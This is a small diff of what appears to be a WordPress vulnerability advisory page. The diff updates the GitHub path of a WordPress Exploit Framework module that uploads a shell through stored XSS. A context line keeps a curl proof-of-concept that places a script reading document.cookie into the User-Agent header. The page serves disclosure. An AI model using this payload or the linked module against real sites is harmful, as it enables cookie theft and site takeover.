@@ -58,7 +58,7 @@ curl -A "User-Agent: <script>alert(document.cookie);</script>" -O http://<target
 ```
 
 ## WordPress Exploit Framework Module
-[exploit/xss/stored/dwnldr\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/modules/exploit/xss/stored/dwnldr_xss_shell_upload.rb)
+[exploit/xss/stored/dwnldr\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/lib/wpxf/modules/exploit/xss/stored/dwnldr_xss_shell_upload.rb)
 
 ## WPVDB-ID
 8556
